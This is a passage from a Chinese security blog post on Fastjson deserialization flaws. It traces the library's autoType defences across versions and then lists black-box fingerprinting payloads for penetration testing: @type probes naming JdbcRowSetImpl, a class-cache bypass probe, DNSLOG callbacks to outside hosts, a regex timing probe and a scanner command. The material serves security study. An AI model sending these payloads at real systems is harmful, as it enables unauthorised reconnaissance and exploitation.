<td><strong>1.2.68+</strong></td>
<td>默认关闭</td>
<td><strong>增强白名单 + 通配符支持</strong></td>
<td>扩展默认白名单，修复历史漏洞</td>
</tr>
<tr>
<td><strong>1.2.83+</strong></td>
<td>默认关闭</td>
<td><strong>SafeMode（安全模式）</strong></td>
<td>彻底禁用 <code>@type</code> 功能，杜绝反序列化攻击</td>
</tr>
</tbody></table>
<hr>
<h3 id="各阶段详细说明"><a href="#各阶段详细说明" class="headerlink" title="各阶段详细说明"></a><strong>各阶段详细说明</strong></h3><h4 id="1-无限制阶段（≤1-2-24）"><a href="#1-无限制阶段（≤1-2-24）" class="headerlink" title="1. 无限制阶段（≤1.2.24）"></a>1. 无限制阶段（≤1.2.24）</h4><ul>
<li><strong>默认 <code>autoType</code> 状态</strong>：开启（无显式配置，等效于 <code>autoTypeSupport=true</code>）。</li>
<li><strong>防御机制</strong>：无黑名单或白名单，允许任意类通过 <code>@type</code> 反序列化。</li>
<li><strong>风险</strong>：可直接加载任意类（如 <code>com.sun.rowset.JdbcRowSetImpl</code>），导致 <strong>远程代码执行（RCE）</strong>。</li>
</ul>
<hr>
<h4 id="2-黑名单阶段（1-2-25-1-2-47）"><a href="#2-黑名单阶段（1-2-25-1-2-47）" class="headerlink" title="2. 黑名单阶段（1.2.25~1.2.47）"></a>2. 黑名单阶段（1.2.25~1.2.47）</h4><ul>
<li><strong>默认 <code>autoType</code> 状态</strong>：关闭（<code>autoTypeSupport=false</code>）。</li>
<li><strong>防御机制</strong>：<ul>
<li><strong>黑名单（<code>denyList</code>）</strong>：拦截高危类（如 <code>ClassLoader</code>、<code>DataSource</code>、<code>JdbcRowSetImpl</code> 等）。</li>
<li><strong>白名单</strong>：未明确配置，仅允许部分基础类型（如 <code>java.util.List</code>）。</li>
</ul>
</li>
<li><strong>漏洞</strong>：<ul>
<li><strong>缓存绕过漏洞</strong>（1.2.47）：通过 <code>java.lang.Class</code> 预加载恶意类至缓存，绕过黑名单。</li>
</ul>
</li>
<li><strong>安全建议</strong>：升级至 1.2.48+，避免使用 1.2.47。</li>
</ul>
<hr>
<h4 id="3-白名单优先阶段（1-2-48-1-2-67）"><a href="#3-白名单优先阶段（1-2-48-1-2-67）" class="headerlink" title="3. 白名单优先阶段（1.2.48~1.2.67）"></a>3. 白名单优先阶段（1.2.48~1.2.67）</h4><ul>
<li><strong>默认 <code>autoType</code> 状态</strong>：关闭。</li>
<li><strong>防御机制</strong>：<ul>
<li><strong>白名单优先校验</strong>：即使开启 <code>autoType</code>，也必须匹配白名单（<code>acceptList</code>）或手动添加信任路径。</li>
<li><strong>黑名单兜底</strong>：拦截已知高危类。</li>
<li><strong>默认白名单</strong>：少量核心类（如 <code>java.lang.Integer</code>、<code>java.util.Date</code>）。</li>
</ul>
</li>
<li><strong>修复内容</strong>：<ul>
<li>修复缓存绕过漏洞。</li>
<li>将 <code>java.lang.Class</code> 加入黑名单。</li>
</ul>
</li>
<li><strong>限制</strong>：白名单范围较窄，需手动扩展业务相关类。</li>
</ul>
<hr>
<h4 id="4-增强白名单阶段（1-2-68-1-2-82）"><a href="#4-增强白名单阶段（1-2-68-1-2-82）" class="headerlink" title="4. 增强白名单阶段（1.2.68~1.2.82）"></a>4. 增强白名单阶段（1.2.68~1.2.82）</h4><ul>
<li><strong>默认 <code>autoType</code> 状态</strong>：关闭。</li>
<li><strong>防御机制</strong>：<ul>
<li><strong>扩展默认白名单</strong>：包含更多 JDK 内置类（如 <code>java.lang.Cloneable</code>）。</li>
<li><strong>支持通配符</strong>：允许配置包路径（如 <code>com.example.model.*</code>）。</li>
</ul>
</li>
<li><strong>安全改进</strong>：<ul>
<li>修复历史漏洞（如 <code>TemplatesImpl</code> 链的利用限制）。</li>
<li>优化黑名单覆盖范围。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="5-SafeMode-阶段（1-2-83-）"><a href="#5-SafeMode-阶段（1-2-83-）" class="headerlink" title="5. SafeMode 阶段（1.2.83+）"></a>5. SafeMode 阶段（1.2.83+）</h4><ul>
<li><strong>默认 <code>autoType</code> 状态</strong>：关闭。</li>
<li><strong>新增防御机制</strong>：<ul>
<li><strong>SafeMode（安全模式）</strong>：<br>通过 <code>ParserConfig.getGlobalInstance().setSafeMode(true)</code> 开启后，<strong>完全禁用 <code>@type</code> 功能</strong>，任何包含 <code>@type</code> 的 JSON 字符串均抛出异常。</li>
</ul>
</li>
<li><strong>默认白名单</strong>：进一步精简，仅保留最安全的核心类。</li>
<li><strong>设计目标</strong>：彻底杜绝反序列化攻击，适用于高安全场景。</li>
</ul>
<hr>
<h3 id="关键版本对比表"><a href="#关键版本对比表" class="headerlink" title="关键版本对比表"></a><strong>关键版本对比表</strong></h3><table>
<thead>
<tr>
<th>版本</th>
<th>默认 <code>autoType</code></th>
<th>默认黑名单</th>
<th>默认白名单</th>
<th>SafeMode 支持</th>
</tr>
</thead>
<tbody><tr>
<td>1.2.24</td>
<td>开启</td>
<td>❌</td>
<td>❌</td>
<td>❌</td>
</tr>
<tr>
<td>1.2.25</td>
<td>关闭</td>
<td>✔️</td>
<td>❌</td>
<td>❌</td>
</tr>
<tr>
<td>1.2.47</td>
<td>关闭</td>
<td>✔️</td>
<td>❌</td>
<td>❌</td>
</tr>
<tr>
<td>1.2.48</td>
<td>关闭</td>
<td>✔️</td>
<td>✔️</td>
<td>❌</td>
</tr>
<tr>
<td>1.2.68</td>
<td>关闭</td>
<td>✔️</td>
<td>✔️（扩展）</td>
<td>❌</td>
</tr>
<tr>
<td>1.2.83</td>
<td>关闭</td>
<td>✔️</td>
<td>✔️（精简）</td>
<td>✔️</td>
</tr>
</tbody></table>
<hr>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul>
<li><strong>无限制阶段（≤1.2.24）</strong>：完全开放，风险最高。</li>
<li><strong>黑名单阶段（1.2.25~1.2.47）</strong>：基础防御，存在绕过漏洞。</li>
<li><strong>白名单阶段（1.2.48+）</strong>：逐步强化，修复历史漏洞。</li>
<li><strong>SafeMode 阶段（1.2.83+）</strong>：终极防御，彻底禁用 <code>@type</code>。<br>  始终遵循 <strong>最小化信任原则</strong>，避免依赖 Fastjson 的默认配置应对高风险场景。</li>
</ul>
<h1 id="5-黑盒测试中的版本探测"><a href="#5-黑盒测试中的版本探测" class="headerlink" title="5.黑盒测试中的版本探测"></a>5.黑盒测试中的版本探测</h1><h2 id="在渗透测试或安全评估中，探测目标使用的-Fastjson-版本-是评估反序列化漏洞风险的关键步骤。以下是在黑盒环境中常用的探测方法及其原理："><a href="#在渗透测试或安全评估中，探测目标使用的-Fastjson-版本-是评估反序列化漏洞风险的关键步骤。以下是在黑盒环境中常用的探测方法及其原理：" class="headerlink" title="  在渗透测试或安全评估中，探测目标使用的 Fastjson 版本 是评估反序列化漏洞风险的关键步骤。以下是在黑盒环境中常用的探测方法及其原理：
  "></a>  在渗透测试或安全评估中，探测目标使用的 <strong>Fastjson 版本</strong> 是评估反序列化漏洞风险的关键步骤。以下是在黑盒环境中常用的探测方法及其原理：
  </h2><h3 id="1-通过报错信息特征识别"><a href="#1-通过报错信息特征识别" class="headerlink" title="1. 通过报错信息特征识别"></a><strong>1. 通过报错信息特征识别</strong></h3><p>  ​	通过报错信息识别需要服务端配置报错显示，server.error.include-message&#x3D;always</p>
<h4 id="1-利用AutoCloseable和异常JSON接口"><a href="#1-利用AutoCloseable和异常JSON接口" class="headerlink" title="(1) 利用AutoCloseable和异常JSON接口"></a>(1) 利用AutoCloseable和异常JSON接口</h4><ul>
<li><p><strong>Payload</strong>：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>版本特征</strong>：</p>
<ul>
<li>返回版本信息。</li>
<li>但是不一定准确，可能返回版本信息降级，例如80版本可能返回可能是76版本。</li>
</ul>
</li>
</ul>
<h2 id="2-利用-type-参数触发黑名单拦截-Payload：-版本特征：-1-2-25-1-2-47：返回-autoType-is-not-support，但可能暴露黑名单机制。-1-2-48-：返回更具体的错误信息（如-autoType-is-not-support-java-lang-AutoCloseable）。"><a href="#2-利用-type-参数触发黑名单拦截-Payload：-版本特征：-1-2-25-1-2-47：返回-autoType-is-not-support，但可能暴露黑名单机制。-1-2-48-：返回更具体的错误信息（如-autoType-is-not-support-java-lang-AutoCloseable）。" class="headerlink" title="    #### (2) 利用 @type 参数触发黑名单拦截  - Payload：      - 版本特征：    - 1.2.25~1.2.47：返回 autoType is not support，但可能暴露黑名单机制。    - **1.2.48+**：返回更具体的错误信息（如 autoType is not support. java.lang.AutoCloseable）。
  "></a>  <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250418145223825.png?x-oss-process=style/img-to-webp" alt="image-20250418145223825"><br><br>  #### <strong>(2) 利用 <code>@type</code> 参数触发黑名单拦截</strong><br>  - <strong>Payload</strong>：<br><br>    <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>  - <strong>版本特征</strong>：<br><br>    - <strong>1.2.25~1.2.47</strong>：返回 <code>autoType is not support</code>，但可能暴露黑名单机制。<br>    - **1.2.48+**：返回更具体的错误信息（如 <code>autoType is not support. java.lang.AutoCloseable</code>）。
  </h2><h3 id="2-通过特性支持差异探测"><a href="#2-通过特性支持差异探测" class="headerlink" title="2. 通过特性支持差异探测"></a><strong>2. 通过特性支持差异探测</strong></h3><h4 id="1-测试-Feature-SupportNonPublicField-支持"><a href="#1-测试-Feature-SupportNonPublicField-支持" class="headerlink" title="(1) 测试 Feature.SupportNonPublicField 支持"></a>(1) 测试 <code>Feature.SupportNonPublicField</code> 支持</h4><ul>
<li><p><strong>Payload</strong>：尝试反序列化非公有字段。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>版本特征</strong>：</p>
<ul>
<li><strong>≤1.2.24</strong>：无防护，直接加载类。</li>
<li><strong>1.2.25~1.2.47</strong>：触发缓存绕过漏洞（若成功加载，可能返回 JNDI 连接错误）。</li>
<li>**1.2.48+**：返回 <code>autoType is not support</code>。</li>
</ul>
</li>
</ul>
<h4 id="2-测试-autoTypeSupport-默认状态"><a href="#2-测试-autoTypeSupport-默认状态" class="headerlink" title="(2) 测试 autoTypeSupport 默认状态"></a>(2) 测试 <code>autoTypeSupport</code> 默认状态</h4><ul>
<li><p><strong>Payload</strong>：尝试加载非白名单类。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.util.Random&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>版本特征</strong>：</p>
<ul>
<li><strong>1.2.25~1.2.47（autoType关闭）</strong>：返回 <code>autoType is not support</code>。</li>
<li><strong>1.2.48+（autoType关闭）</strong>：同上，但错误信息更明确。</li>
<li><strong>若目标开启 autoType</strong>：可能返回类不存在或依赖错误（如 <code>ClassNotFoundException: java.util.Random</code>）。</li>
</ul>
</li>
</ul>
<p>  <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250418150945715.png?x-oss-process=style/img-to-webp" alt="image-20250418150945715"></p>
<ul>
<li><strong>Payload：</strong> 利用CookiePolicy类进行autoTypeSupport</li>
</ul>
  <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.CookiePolicy&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet4Address&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;f59984c3.log.cdncache.rr.nu&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>返回特征：</strong>如果dnslog成功回显，表示autoTypeSupport开启。回显失败，表示关闭。</li>
</ul>
<h3 id="3-利用版本独有特性"><a href="#3-利用版本独有特性" class="headerlink" title="3. 利用版本独有特性"></a><strong>3. 利用版本独有特性</strong></h3><h4 id="1-时间格式化差异"><a href="#1-时间格式化差异" class="headerlink" title="(1) 时间格式化差异"></a><strong>(1) 时间格式化差异</strong></h4><ul>
<li><p><strong>Payload</strong>：发送不同格式的日期字符串。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;date&quot;</span><span class="punctuation">:</span><span class="string">&quot;2023-10-01T12:00:00Z&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>版本特征</strong>：</p>
<ul>
<li>**1.2.36+**：支持 ISO 8601 日期格式（需开启 <code>Feature.AllowISO8601DateFormat</code>）。</li>
<li><strong>旧版本</strong>：可能解析失败或返回默认格式。</li>
</ul>
</li>
</ul>
<h4 id="2-反序列化字节码支持（TemplatesImpl-链）"><a href="#2-反序列化字节码支持（TemplatesImpl-链）" class="headerlink" title="(2) 反序列化字节码支持（TemplatesImpl 链）"></a><strong>(2) 反序列化字节码支持（TemplatesImpl 链）</strong></h4><ul>
<li><strong>Payload</strong>：构造 <code>_bytecodes</code> 字段的恶意 JSON（需开启 <code>Feature.SupportNonPublicField</code>）。</li>
<li><strong>版本特征</strong>：<ul>
<li><strong>1.2.22~1.2.24</strong>：直接执行字节码。</li>
<li>**1.2.25+**：默认拦截 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="4-响应头与库路径泄露"><a href="#4-响应头与库路径泄露" class="headerlink" title="4. 响应头与库路径泄露"></a><strong>4. 响应头与库路径泄露</strong></h3><h4 id="1-观察-HTTP-响应头"><a href="#1-观察-HTTP-响应头" class="headerlink" title="(1) 观察 HTTP 响应头"></a><strong>(1) 观察 HTTP 响应头</strong></h4><ul>
<li><strong>特征</strong>：某些框架集成 Fastjson 后，错误响应头可能包含库信息：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Fastjson/1.2.68</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="2-触发类路径泄露"><a href="#2-触发类路径泄露" class="headerlink" title="(2) 触发类路径泄露"></a><strong>(2) 触发类路径泄露</strong></h4><ul>
<li><p><strong>Payload</strong>：利用反序列化错误触发类加载器信息。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.ClassLoader&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>响应特征</strong>：</p>
<ul>
<li><strong>1.2.25~1.2.47</strong>：返回 <code>autoType is not support</code>。</li>
<li>**1.2.48+**：返回 <code>ClassLoader is denied</code>。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="5-出网探测"><a href="#5-出网探测" class="headerlink" title="5.出网探测"></a>5.出网探测</h3><ul>
<li><strong>DNSLOG</strong>：利用dnslog进行出网探测</li>
</ul>
  <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet4Address&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;25dadd82.log.dnslog.myfw.us&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>不同版本的DNSLOG探测</strong></p>
<ul>
<li>fastjson &lt; 1.2.48</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.InetSocketAddress&quot;</span><span class="punctuation">&#123;</span><span class="attr">&quot;address&quot;</span><span class="punctuation">:</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;48_.&#123;&#123;.Variables.DNS&#125;&#125;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>

<ul>
<li>1.2.48 ≤ fastjson ≤ 1.2.68</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.alibaba.fastjson.JSONReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://68_.&#123;&#123;.Variables.DNS&#125;&#125;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>1.2.68 &lt; fastjson ≤ 1.2.83</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Exception&quot;</span><span class="punctuation">,</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.alibaba.fastjson.JSONException&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;x&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.InetSocketAddress&quot;</span><span class="punctuation">&#123;</span><span class="attr">&quot;address&quot;</span><span class="punctuation">:</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;80_.&#123;&#123;.Variables.DNS&#125;&#125;&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">		<span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Exception&quot;</span><span class="punctuation">,</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.alibaba.fastjson.JSONException&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.InetSocketAddress&quot;</span><span class="punctuation">&#123;</span><span class="attr">&quot;address&quot;</span><span class="punctuation">:</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;83_.&#123;&#123;.Variables.DNS&#125;&#125;&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">		<span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="6-正则延迟探测"><a href="#6-正则延迟探测" class="headerlink" title="6.正则延迟探测"></a>6.正则延迟探测</h3><ul>
<li>在目标无法出网时，且无报错信息时我们可以利用正则表达式来进行延迟探测。</li>
<li><strong>payload：</strong></li>
</ul>
  <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;regex&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$[blue rlike &#x27;^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$&#x27;]&quot;</span>  </span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;blue&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aaaaaaaaaaaaaaaa!&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>返回特征：</strong><ul>
<li>当版本在1.2.36-1.2.62版本之间时，产生延时响应，否则不产生延迟响应。</li>
</ul>
</li>
</ul>
<h3 id="7-依赖探测"><a href="#7-依赖探测" class="headerlink" title="7.依赖探测"></a>7.依赖探测</h3><ul>
<li><p><strong>payload：</strong>利用Character类和畸形payload进行依赖探测</p>
</li>
<li><p><strong>eg：</strong>探测JndiObjectFactory依赖是否存在（可将shiro依赖更换为不同依赖类路径进行探测）</p>
</li>
</ul>
  <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Character&quot;</span><span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>返回特征：</strong></p>
<ul>
<li>具有依赖时</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-04-18T08:30:21.258+00:00&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="number">500</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;error&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Internal Server Error&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;can not cast to char, value : class org.apache.shiro.jndi.JndiObjectFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/json&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="8-自动化探测工具"><a href="#8-自动化探测工具" class="headerlink" title="8. 自动化探测工具"></a><strong>8. 自动化探测工具</strong></h3><h4 id="1-FastjsonScan"><a href="#1-FastjsonScan" class="headerlink" title="(1) FastjsonScan"></a><strong>(1) FastjsonScan</strong></h4><ul>
<li><p><strong>功能</strong>：批量检测 Fastjson 版本及漏洞。</p>
</li>
<li><p><strong>命令</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python FastjsonScan.py -u http://target.com/api</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="2-Burp-Suite-插件"><a href="#2-Burp-Suite-插件" class="headerlink" title="(2) Burp Suite 插件"></a><strong>(2) Burp Suite 插件</strong></h4><ul>
<li><strong>插件推荐</strong>：<code>Fastjson-Detector</code> 或 <code>Freddy</code>（支持被动扫描）。</li>
</ul>
<hr>
<h3 id="版本判定对照表"><a href="#版本判定对照表" class="headerlink" title="版本判定对照表"></a><strong>版本判定对照表</strong></h3><table>
<thead>
<tr>
<th>探测特征</th>
<th>可能版本</th>
</tr>
</thead>
<tbody><tr>
<td>无防护，直接执行 <code>TemplatesImpl</code></td>
<td>≤1.2.24</td>
</tr>
<tr>
<td>缓存绕过漏洞有效（JdbcRowSetImpl）</td>
<td>1.2.25~1.2.47</td>
</tr>
<tr>
<td>返回 <code>SafeMode not support</code></td>
<td>≥1.2.83</td>
</tr>
<tr>
<td>支持 <code>Feature.SupportNonPublicField</code></td>
<td>1.2.25+（需显式开启）</td>
</tr>
</tbody></table>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/avtor.png?x-oss-process=style/img-to-webp" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/avtor.png?x-oss-process=style/img-to-webp" title="头像" alt="头像"></a><div class="post-copyright__author_name">Takake</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://blog.takake.com/posts/32163/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://blog.takake.com/posts/32163/')">Fastjson安全漏洞分析</span></a></div><div class="post-tools" 